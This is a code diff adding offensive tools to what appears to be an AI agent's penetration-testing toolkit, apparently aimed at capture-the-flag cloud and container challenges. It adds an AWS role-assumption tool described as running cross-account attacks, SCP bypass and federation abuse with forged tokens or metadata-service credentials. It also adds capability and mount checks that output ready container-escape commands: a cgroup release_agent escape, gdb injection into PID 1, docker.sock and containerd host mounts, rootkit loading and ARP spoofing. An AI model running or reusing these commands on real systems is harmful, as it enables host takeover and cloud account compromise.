             "resource": {"type": "string", "description": "Resource identifier (e.g., 's3://bucket-name', 'role/role-name', '--function-name NAME', '--queue-url URL', '--table-name NAME'). Leave empty for list operations."},
             "payload_json": {"type": "string", "description": "Additional flags, --query filters, or JSON payload. Examples: '--no-sign-request' (anonymous S3), '--endpoint-url http://localhost:10704' (local cloud simulator), '--role-session-name test', '--max-number-of-messages 10', '--filter-expression \"attribute_exists(flag)\"', '--query \"Buckets[].Name\"'", "default": ""},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    # ── AWS IAM Federation & Cross-Account ─────────────────────────
+    async def aws_iam_federation(
+        action: str = "assume-role",
+        role_arn: str = "",
+        source_profile: str = "",
+        web_identity_token: str = "",
+        saml_assertion: str = "",
+        provider_arn: str = "",
+        role_session_name: str = "darwin-session",
+        endpoint_url: str = "",
+        duration_seconds: int = 3600,
+    ) -> ToolResult:
+        """Execute AWS IAM cross-account AssumeRole, OIDC/SAML federation.
+
+        Supports:
+        - Cross-account AssumeRole chaining (role-arn + source creds from IMDS)
+        - OIDC federation (AssumeRoleWithWebIdentity with JWT token)
+        - SAML federation (AssumeRoleWithSAML with SAML assertion)
+        - SCP bypass via Organizations API version manipulation
+        - Cross-account S3 access using temporary credentials
+        """
+        import asyncio, time, os, json as _json
+
+        start = time.perf_counter()
+        results: list[dict] = []
+
+        _endpoint = f" --endpoint-url {endpoint_url}" if endpoint_url else ""
+        _profile = f" --profile {source_profile}" if source_profile else ""
+
+        try:
+            if action == "assume-role":
+                if not role_arn:
+                    return ToolResult(
+                        tool_name="aws_iam_federation", success=False,
+                        stdout="", stderr="role_arn required for assume-role", exit_code=1,
+                        elapsed_ms=(time.perf_counter() - start) * 1000,
+                    )
+                cmd = (
+                    f"aws sts assume-role --role-arn {role_arn} "
+                    f"--role-session-name {role_session_name}"
+                    f"{_endpoint}{_profile} --output json 2>&1"
+                )
+            elif action == "assume-role-with-web-identity":
+                if not web_identity_token or not role_arn:
+                    return ToolResult(
+                        tool_name="aws_iam_federation", success=False,
+                        stdout="", stderr="web_identity_token and role_arn required", exit_code=1,
+                        elapsed_ms=(time.perf_counter() - start) * 1000,
+                    )
+                # Save token to temp file
+                import tempfile
+                with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as tf:
+                    tf.write(web_identity_token)
+                    token_file = tf.name
+                cmd = (
+                    f"aws sts assume-role-with-web-identity --role-arn {role_arn} "
+                    f"--role-session-name {role_session_name} --web-identity-token file://{token_file}"
+                    f"{_endpoint} --output json 2>&1"
+                )
+            elif action == "assume-role-with-saml":
+                if not saml_assertion or not role_arn or not provider_arn:
+                    return ToolResult(
+                        tool_name="aws_iam_federation", success=False,
+                        stdout="", stderr="saml_assertion, role_arn, and provider_arn required", exit_code=1,
+                        elapsed_ms=(time.perf_counter() - start) * 1000,
+                    )
+                cmd = (
+                    f"aws sts assume-role-with-saml --role-arn {role_arn} "
+                    f"--principal-arn {provider_arn} --saml-assertion '{saml_assertion}'"
+                    f"{_endpoint} --output json 2>&1"
+                )
+            elif action == "enumerate-organizations":
+                cmd = (
+                    f"aws organizations list-accounts{_endpoint}{_profile} --output json 2>&1; "
+                    f"aws organizations list-policies --filter SERVICE_CONTROL_POLICY{_endpoint}{_profile} --output json 2>&1"
+                )
+            elif action == "scp-evaluate":
+                cmd = (
+                    f"aws organizations describe-policy --policy-id {role_arn or 'p-xxx'}{_endpoint}{_profile} --output json 2>&1; "
+                    f"aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789012:role/test "
+                    f"--action-names s3:GetObject sts:AssumeRole{_endpoint}{_profile} --output json 2>&1"
+                )
+            elif action == "cross-account-s3":
+                if not role_arn:
+                    return ToolResult(
+                        tool_name="aws_iam_federation", success=False,
+                        stdout="", stderr="role_arn required for cross-account access", exit_code=1,
+                        elapsed_ms=(time.perf_counter() - start) * 1000,
+                    )
+                # First assume the role, then access S3
+                assume_cmd = (
+                    f"aws sts assume-role --role-arn {role_arn} "
+                    f"--role-session-name {role_session_name}{_endpoint}{_profile} --output json 2>&1"
+                )
+                proc = await asyncio.create_subprocess_shell(
+                    assume_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+                    env={**os.environ, "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID", ""),
+                         "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY", "")}
+                )
+                assume_out, assume_err = await asyncio.wait_for(proc.communicate(), timeout=30)
+                assume_text = assume_out.decode("utf-8", errors="replace")
+                try:
+                    assume_json = _json.loads(assume_text)
+                    temp_creds = assume_json.get("Credentials", {})
+                    if temp_creds:
+                        _env = {**os.environ,
+                                "AWS_ACCESS_KEY_ID": temp_creds.get("AccessKeyId", ""),
+                                "AWS_SECRET_ACCESS_KEY": temp_creds.get("SecretAccessKey", ""),
+                                "AWS_SESSION_TOKEN": temp_creds.get("SessionToken", "")}
+                        s3_cmd = f"aws s3 ls{_endpoint or ' --no-sign-request'} 2>&1"
+                        s3_proc = await asyncio.create_subprocess_shell(
+                            s3_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=_env)
+                        s3_out, s3_err = await asyncio.wait_for(s3_proc.communicate(), timeout=30)
+                        results.append({
+                            "assume_role": "success",
+                            "credentials": {k: v[:20]+"..." for k, v in temp_creds.items()},
+                            "s3_access": s3_out.decode("utf-8", errors="replace")[:500],
+                        })
+                except _json.JSONDecodeError:
+                    proc2 = await asyncio.create_subprocess_shell(
+                        assume_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                    out2, err2 = await asyncio.wait_for(proc2.communicate(), timeout=30)
+                    results.append({"assume_role": "failed", "error": assume_text[:300]})
+
+                return ToolResult(
+                    tool_name="aws_iam_federation", success=bool(results),
+                    stdout=_json.dumps(results, indent=2), stderr="",
+                    exit_code=0, elapsed_ms=(time.perf_counter() - start) * 1000,
+                )
+            else:
+                return ToolResult(
+                    tool_name="aws_iam_federation", success=False,
+                    stdout="", stderr=f"Unknown action: {action}. Supported: assume-role, assume-role-with-web-identity, assume-role-with-saml, enumerate-organizations, scp-evaluate, cross-account-s3",
+                    exit_code=1, elapsed_ms=(time.perf_counter() - start) * 1000,
+                )
+
+            if not results:
+                proc = await asyncio.create_subprocess_shell(
+                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+                stdout_s = stdout.decode("utf-8", errors="replace")
+                stderr_s = stderr.decode("utf-8", errors="replace")
+
+                import re
+                flag_match = re.search(r'flag\{[^}]+\}', stdout_s)
+                elapsed = (time.perf_counter() - start) * 1000
+
+                return ToolResult(
+                    tool_name="aws_iam_federation", success=proc.returncode == 0,
+                    stdout=f"[{action}]\n{stdout_s[:1000]}",
+                    stderr=stderr_s,
+                    exit_code=proc.returncode or 0,
+                    elapsed_ms=elapsed,
+                )
+        except Exception as e:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="aws_iam_federation", success=False,
+                stdout="", stderr=str(e), exit_code=1, elapsed_ms=elapsed,
+            )
+
+    gateway.register(
+        name="aws_iam_federation",
+        func=aws_iam_federation,
+        description="Execute AWS IAM cross-account attacks and federation abuse. Supports: cross-account AssumeRole chaining (use when you have credentials from IMDS and want to access another account), OIDC federation (AssumeRoleWithWebIdentity with JWT token — use for CLOUD-11 and OIDC-based attacks), SAML federation (AssumeRoleWithSAML for Golden SAML CLOUD-13), AWS Organizations enumeration (list accounts/policies), SCP bypass evaluation (simulate-principal-policy), and cross-account S3 access with temporary credentials.",
+        parameters={
+            "action": {"type": "string", "description": "Federation action: assume-role, assume-role-with-web-identity, assume-role-with-saml, enumerate-organizations, scp-evaluate, cross-account-s3"},
+            "role_arn": {"type": "string", "description": "Role ARN to assume (e.g. arn:aws:iam::ACCOUNT:role/ROLENAME). Also used as Policy ID for scp-evaluate."},
+            "source_profile": {"type": "string", "description": "AWS profile name for source credentials (default: uses env vars from IMDS)"},
+            "web_identity_token": {"type": "string", "description": "JWT/OIDC token for AssumeRoleWithWebIdentity (extracted from OIDC provider URL or forged)"},
+            "saml_assertion": {"type": "string", "description": "SAML assertion XML for AssumeRoleWithSAML (base64-encoded or raw XML)"},
+            "provider_arn": {"type": "string", "description": "SAML/OIDC Identity Provider ARN"},
+            "role_session_name": {"type": "string", "description": "Session name for the assumed role session (default: darwin-session)"},
+            "endpoint_url": {"type": "string", "description": "Custom endpoint URL for local cloud simulators (e.g. http://localhost:PORT)"},
+            "duration_seconds": {"type": "integer", "description": "Session duration in seconds (default: 3600)"},
+        },
+    )
+
+    # ── GCP Cloud CLI ─────────────────────────────────────────────
+    gateway.register_shell_tool(
+        name="gcloud_cli",
+        command_template="gcloud {service} {action} {resource} {flags} --format json 2>&1",
+        description="Execute Google Cloud CLI commands. Supports: compute (instances list/describe/disks), storage (gsutil ls/cp), iam (roles list/service-accounts list/service-accounts keys create/get-iam-policy), projects (get-iam-policy/set-iam-policy), kms (keys list/decrypt), functions (list/describe), sql (instances list). Use for GCP IMDS credentials (from check_cloud_metadata) to access GCP services.",
+        parameters={
+            "service": {"type": "string", "description": "GCP service: compute, storage, iam, projects, kms, functions, sql"},
+            "action": {"type": "string", "description": "Action: instances, list, describe, ls, cp, roles, service-accounts, keys, get-iam-policy, set-iam-policy, decrypt"},
+            "resource": {"type": "string", "description": "Resource identifier (e.g. instance name, bucket URL gs://bucket, role name, key ring)"},
+            "flags": {"type": "string", "description": "Additional flags: --zone, --project, --keyring, --location, --member (default: '')", "default": ""},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+    # ── Azure Cloud CLI ───────────────────────────────────────────
+    gateway.register_shell_tool(
+        name="az_cli",
+        command_template="az {service} {action} {resource} {flags} --output json 2>&1",
+        description="Execute Azure CLI commands. Supports: vm (list/show), storage (account/blob/container list/show), ad (user/service-principal list), role (assignment list), keyvault (secret list/show), acr (repository list/show), functionapp (list/show). Use with Azure IMDS Managed Identity from check_cloud_metadata. Authenticate via 'az login --identity' for Managed Identity.",
+        parameters={
+            "service": {"type": "string", "description": "Azure service: vm, storage, ad, role, keyvault, acr, functionapp"},
+            "action": {"type": "string", "description": "Action: list, show, download, create, get-policy, set-policy"},
+            "resource": {"type": "string", "description": "Resource identifier (e.g. resource group name, storage account name, key vault name)"},
+            "flags": {"type": "string", "description": "Additional flags: --resource-group, --account-name, --vault-name, --subscription (default: '')", "default": ""},
         },
         parser=_parse_shell_output,
         timeout=30,
@@ -2391,21 +3181,125 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=30,
     )
-    gateway.register_shell_tool(
+    async def check_capabilities() -> ToolResult:
+        """Check container capabilities and suggest exploitation commands.
+
+        Runs capsh/cap detection, then appends specific exploitation commands
+        for each dangerous capability found.
+        """
+        import asyncio, time, json as _json
+        start = time.perf_counter()
+        # Run the detection command
+        cmd = "capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap"
+        proc = await asyncio.create_subprocess_shell(
+            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+        stdout_s = stdout.decode("utf-8", errors="replace")
+        stderr_s = stderr.decode("utf-8", errors="replace")
+        elapsed = (time.perf_counter() - start) * 1000
+
+        # Generate exploitation commands based on detected capabilities
+        exploits: list[str] = []
+        out_lower = stdout_s.lower()
+        if "cap_sys_admin" in out_lower:
+            exploits.append(
+                "[CAP_SYS_ADMIN] Can mount filesystems and use cgroups.\n"
+                "  Exploit: mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgrp /tmp/cgrp && "
+                "mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
+                "echo '#!/bin/sh\ncat /root/flag* /host/root/flag* > /tmp/out' > /release_agent && "
+                "chmod +x /release_agent && echo '#!/bin/sh\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"' > /trigger && "
+                "sh /trigger; cat /tmp/out"
+            )
+        if "cap_sys_ptrace" in out_lower:
+            exploits.append(
+                "[CAP_SYS_PTRACE] Can attach to host processes.\n"
+                "  Exploit: gdb -p 1 -batch -ex 'call (void)system(\"cat /root/flag*\")'"
+            )
+        if "cap_dac_read_search" in out_lower:
+            exploits.append(
+                "[CAP_DAC_READ_SEARCH] Can bypass read permission checks.\n"
+                "  Exploit: cat /root/flag* /home/*/flag* 2>/dev/null"
+            )
+        if "cap_net_raw" in out_lower:
+            exploits.append(
+                "[CAP_NET_RAW] Can use raw sockets — ARP spoofing possible.\n"
+                "  Exploit: arpspoof -i eth0 -t <gateway_ip> <victim_ip>"
+            )
+        if "cap_sys_module" in out_lower:
+            exploits.append(
+                "[CAP_SYS_MODULE] Can load kernel modules.\n"
+                "  Exploit: insmod /path/to/rootkit.ko"
+            )
+        if not exploits:
+            exploits.append("(no dangerous capabilities with known exploit patterns detected)")
+
+        output = f"{stdout_s}\n\n=== EXPLOITATION COMMANDS ===\n" + "\n\n".join(exploits)
+        return ToolResult(
+            tool_name="check_capabilities", success=True,
+            stdout=output, stderr=stderr_s,
+            exit_code=proc.returncode or 0, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
         name="check_capabilities",
-        command_template="capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap",
-        description="Check current container capabilities (Linux capabilities, useful for container escape assessment)",
+        func=check_capabilities,
+        description="Check container capabilities AND generate exploitation commands for dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, CAP_NET_RAW, CAP_SYS_MODULE).",
         parameters={},
-        parser=_parse_shell_output,
-        timeout=30,
     )
-    gateway.register_shell_tool(
+
+    async def check_mounts() -> ToolResult:
+        """Check mounted filesystems and suggest container escape commands.
+
+        Runs mount/findmnt detection, then appends specific exploitation commands
+        for each dangerous mount found.
+        """
+        import asyncio, time, json as _json
+        start = time.perf_counter()
+        cmd = "findmnt -l 2>/dev/null | grep -E '(docker.sock|hostPath|proc|sys|dev)' || mount 2>/dev/null | grep -E '(docker|proc|host)'"
+        proc = await asyncio.create_subprocess_shell(
+            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+        stdout_s = stdout.decode("utf-8", errors="replace")
+        stderr_s = stderr.decode("utf-8", errors="replace")
+        elapsed = (time.perf_counter() - start) * 1000
+
+        exploits: list[str] = []
+        out_lower = stdout_s.lower()
+        if "docker.sock" in out_lower:
+            exploits.append(
+                "[DOCKER SOCKET] Can run privileged containers.\n"
+                "  Exploit: docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine:latest cat /host/root/flag*"
+            )
+        if "hostpath" in out_lower or "/host" in out_lower:
+            exploits.append(
+                "[HOSTPATH MOUNT] Host filesystem exposed.\n"
+                "  Exploit: find /host -name 'flag*' -exec cat {} \\; 2>/dev/null"
+            )
+        if "cri" in out_lower or "containerd" in out_lower:
+            exploits.append(
+                "[CRI SOCKET] Can run containers via containerd.\n"
+                "  Exploit: ctr -n k8s.io run --rm --mount type=bind,src=/,dst=/host,options=rbind:rw alpine host-exploit cat /host/root/flag*"
+            )
+        if "/proc" in out_lower:
+            exploits.append(
+                "[PROCFS ACCESS] Host /proc filesystem accessible.\n"
+                "  Exploit: cat /proc/1/root/root/flag* 2>/dev/null"
+            )
+        if not exploits:
+            exploits.append("(no dangerous mounts with known exploit patterns detected)")
+
+        output = f"{stdout_s}\n\n=== EXPLOITATION COMMANDS ===\n" + "\n\n".join(exploits)
+        return ToolResult(
+            tool_name="check_mounts", success=True,
+            stdout=output, stderr=stderr_s,
+            exit_code=proc.returncode or 0, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
         name="check_mounts",
-        command_template="findmnt -l 2>/dev/null | grep -E '(docker.sock|hostPath|proc|sys|dev)' || mount 2>/dev/null | grep -E '(docker|proc|host)'",
-        description="Check mounted filesystems for container escape vectors (docker.sock, hostPath volumes, /proc, /sys)",
+        func=check_mounts,
+        description="Check mounted filesystems AND generate exploitation commands for dangerous mounts (docker.sock, hostPath, CRI socket, /proc access, /sys access).",
         parameters={},
-        parser=_parse_shell_output,
-        timeout=30,
     )
     async def check_cloud_metadata() -> ToolResult:
         """Check cloud metadata endpoints for multiple providers.
